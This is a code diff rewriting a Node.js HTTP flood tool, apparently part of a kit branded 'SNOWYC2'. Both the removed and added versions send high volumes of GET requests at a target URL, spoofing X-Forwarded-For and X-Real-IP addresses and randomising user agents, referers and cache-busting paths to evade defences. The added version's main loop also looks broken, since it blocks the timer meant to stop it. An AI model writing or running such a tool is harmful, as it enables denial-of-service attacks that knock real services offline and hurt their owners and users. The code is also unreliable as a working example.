@@ -1,115 +1,113 @@
+const http = require('http');
+const https = require('https');
 const fs = require('fs');
-const { request } = require('undici');
-const readline = require('readline');
-const os = require('os');
+const { URL } = require('url');
 
-const REFERERS = loadLines('refs.txt');
-const USER_AGENTS = loadLines('ua.txt');
+const target = process.argv[2];
+const duration = parseInt(process.argv[3] || '60', 10);
 
-function loadLines(filename) {
+if (!target) {
+    console.log('Usage: node flood.js <url> <time>');
+    process.exit(1);
+}
+
+const REFERERS = readLines('refs.txt');
+const USER_AGENTS = readLines('ua.txt');
+
+function readLines(file) {
     try {
-        return fs.readFileSync(filename, 'utf8')
+        return fs.readFileSync(file, 'utf8')
             .split('\n')
-            .map(line => line.trim())
+            .map(x => x.trim())
             .filter(Boolean);
     } catch {
         return [];
     }
 }
 
-const getRandomIP = () => Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.');
-const getRandom = (arr) => arr[Math.floor(Math.random() * arr.length)] || '';
+const rand = (arr) => arr[Math.floor(Math.random() * arr.length)] || '';
+const randIP = () => Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
+const randPath = () => `/?cb=${Math.random().toString(36).substring(2)}`;
 
-class FloodEngine {
-    constructor(target, duration) {
-        this.target = target;
-        this.endTime = Date.now() + duration * 1000;
+const u = new URL(target);
+const client = u.protocol === 'https:' ? https : http;
+const port = u.port || (u.protocol === 'https:' ? 443 : 80);
 
-        this.stats = { total: 0, success: 0, errors: 0, peakRps: 0 };
-        this.queue = new Set();
-    }
+const headersTemplate = () => ({
+    'User-Agent': rand(USER_AGENTS),
+    'Referer': rand(REFERERS),
+    'X-Forwarded-For': randIP(),
+    'X-Real-IP': randIP(),
+    'Accept': '*/*',
+    'Connection': 'keep-alive'
+});
 
-    async floodLoop(concurrency = 1000) {
-        const rpsWindow = [];
-        const statsInterval = setInterval(() => {
-            const now = Date.now();
-            const currentRps = rpsWindow.filter(ts => now - ts < 1000).length;
-            this.stats.peakRps = Math.max(this.stats.peakRps, currentRps);
+let total = 0;
+let success = 0;
+let failed = 0;
+let peakRps = 0;
 
-            process.stdout.write(`\rSENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${currentRps}    `);
-        }, 1000);
+console.log(`\n  SNOWYC2 - RAW FLOOD MODE`);
+console.log(`  ===============================`);
+console.log(`  TARGET: ${target}`);
+console.log(`  TIME:   ${duration}s`);
+console.log(`  ===============================\n`);
 
-        while (Date.now() < this.endTime) {
-            if (this.queue.size >= concurrency) {
-                await new Promise(r => setTimeout(r, 5));
-                continue;
-            }
+let last = 0;
+const start = Date.now();
+let running = true;
 
-            const task = this.makeRequest().finally(() => this.queue.delete(task));
-            this.queue.add(task);
-            rpsWindow.push(Date.now());
-        }
+setTimeout(() => running = false, duration * 1000);
 
-        clearInterval(statsInterval);
-        await Promise.all(this.queue);
-    }
+setInterval(() => {
+    const current = total;
+    const rps = current - last;
+    last = current;
+    peakRps = Math.max(peakRps, rps);
+    process.stdout.write(`\rSENT: ${total} | OK: ${success} | ERR: ${failed} | RPS: ${rps}`);
+}, 1000);
 
-    async makeRequest() {
-        const noise = `cb=${Math.random().toString(36).substring(2)}`;
-        const url = this.target + (this.target.includes('?') ? '&' : '?') + noise;
-
-        const headers = {
-            'User-Agent': getRandom(USER_AGENTS),
-            'Referer': getRandom(REFERERS),
-            'X-Forwarded-For': getRandomIP(),
-            'X-Real-IP': getRandomIP(),
-            'Accept': '*/*',
-            'Connection': 'keep-alive'
+function floodForever() {
+    while (running) {
+        const path = u.pathname + randPath();
+        const options = {
+            hostname: u.hostname,
+            port: port,
+            path: path,
+            method: 'GET',
+            headers: headersTemplate(),
+            agent: false
         };
 
-        try {
-            const { statusCode } = await request(url, {
-                headers,
-                method: 'GET',
-                throwOnError: false
-            });
+        const req = client.request(options, res => {
+            total++;
+            res.statusCode === 200 ? success++ : failed++;
+            res.resume();
+        });
 
-            this.stats.total++;
-            if (statusCode === 200) this.stats.success++;
-            else this.stats.errors++;
-        } catch {
-            this.stats.total++;
-            this.stats.errors++;
-        }
-    }
+        req.on('error', () => {
+            total++;
+            failed++;
+        });
 
-    printSummary() {
-        const duration = (Date.now() - (this.endTime - (this.stats.total * 1000 / this.stats.peakRps))) / 1000;
-        const avg = this.stats.total / duration;
-
-        console.log('\n\n=== FLOOD FINISHED ===');
-        console.log(`Duration:  ${duration.toFixed(1)}s`);
-        console.log(`Total:     ${this.stats.total}`);
-        console.log(`200 OK:    ${this.stats.success}`);
-        console.log(`Errors:    ${this.stats.errors}`);
-        console.log(`Avg RPS:   ${avg.toFixed(1)}`);
-        console.log(`Peak RPS:  ${this.stats.peakRps}`);
-        console.log('======================\n');
+        req.end();
     }
 }
 
-(async () => {
-    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
-    const ask = (q) => new Promise(resolve => rl.question(q, resolve));
+for (;;) {
+    if (!running) break;
+    setImmediate(floodForever);
+}
 
-    let target = await ask('TARGET: ');
-    let duration = await ask('DURATION (seconds): ');
-    rl.close();
-
-    if (!target.startsWith('http')) target = 'http://' + target;
-    duration = parseInt(duration);
-
-    const engine = new FloodEngine(target, duration);
-    await engine.floodLoop(os.cpus().length * 50); // clean, high concurrency
-    engine.printSummary();
-})();
+process.on('exit', () => {
+    const elapsed = (Date.now() - start) / 1000;
+    console.log('\n\n  ATTACK FINISHED');
+    console.log('  ===============================');
+    console.log(`  TIME:     ${elapsed.toFixed(1)}s`);
+    console.log(`  TOTAL:    ${total}`);
+    console.log(`  SUCCESS:  ${success}`);
+    console.log(`  ERRORS:   ${failed}`);
+    console.log(`  AVG RPS:  ${(total / elapsed).toFixed(1)}`);
+    console.log(`  PEAK RPS: ${peakRps}`);
+    console.log('  ===============================\n');
+});
